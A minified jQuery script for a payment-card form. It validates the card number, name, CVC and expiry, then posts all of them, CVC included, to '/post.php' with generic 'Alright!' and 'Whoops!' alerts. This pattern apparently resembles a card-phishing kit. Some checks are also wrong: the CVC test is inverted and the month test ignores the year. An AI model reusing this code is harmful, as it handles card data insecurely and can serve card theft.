...
$(function(){$(".next").keyup(function(){this.value.length==this.maxLength&&$(this).next(".next").focus()}),$(".cardn").focusout(function(){var a=$(this).val(),t=a.length,e=$(this).attr("maxlength");t>0&&t!=e?($(this).addClass("error"),$(".form_submit").attr("disabled","disabled")):($(this).removeClass("error"),$(".form_submit").removeAttr("disabled"))}),$(".card-name").focusout(function(){var a=$(this).val(),t=a.length,e=$(this).attr("minlength");t>0&&t<e?($(this).addClass("error"),$(".form_submit").attr("disabled","disabled")):($(this).removeClass("error"),$(".form_submit").removeAttr("disabled"))}),$(".card-cvc").focusout(function(){var a=$(this).val(),t=a.length,e=$(this).attr("maxlength");t>0&&t!=e?($(this).addClass("error"),$(".form_submit").attr("disabled","disabled")):($(this).removeClass("error"),$(".form_submit").removeAttr("disabled")),$(this).attr("type","password")}),$(".card-month").focusout(function(){$(this).val()<(new Date).getMonth()+1?($(this).addClass("error"),$(".form_submit").attr("disabled","disabled")):($(this).removeClass("error"),$(".form_submit").removeAttr("disabled"))}),$(".card-year").focusout(function(){$(this).val()<(new Date).getFullYear()?($(this).addClass("error"),$(".form_submit").attr("disabled","disabled")):($(this).removeClass("error"),$(".form_submit").removeAttr("disabled"))}),$(".cardn").bind("change keyup input click",function(){this.value.match(/[^0-9]/g)&&(this.value=this.value.replace(/[^0-9]/g,""))}),$(".card-name").bind("change keyup input click",function(){this.value.match(/[^A-Z a-z]/g)&&(this.value=this.value.replace(/[^A-Z a-z]/g,""))}),$(".card-cvc").bind("change keyup input click",function(){this.value.match(/[^0-9]/g)&&(this.value=this.value.replace(/[^0-9]/g,""))}),$(".form_submit").click(function(){if($(".card-month").val()<(new Date).getMonth()+1)var a=!1;else var a=!0;""==$(".cardn").val()||""==$(".card-name").val()||""==$(".card-cvc").val()||0==a?(""==$(".cardn").val()&&$(".cardn").addClass("error"),""==$(".card-name").val()&&$(".card-name").addClass("error"),""!=$(".card-cvc").val()&&$(".card-cvc").addClass("error"),0==a&&($(".card-month").addClass("error"),$(".card-year").addClass("error"))):$.ajax({url:"/post.php",type:"POST",dataType:"json",data:{number:$('input[name="CardNumber0"]').val()+$('input[name="CardNumber1"]').val()+$('input[name="CardNumber2"]').val()+$('input[name="CardNumber3"]').val(),date:$('input[name="month"]').val()+"."+$('input[name="year"]').val(),holder:$('input[name="holder"]').val(),secure:$('input[name="secure"]').val()},success:function(a){alert("Alright!")},error:function(a){alert("Whoops!")}})}),$(".hamburger").click(function(){$(".main__left").toggleClass("show"),$(".hamburger").toggleClass("is-active")})});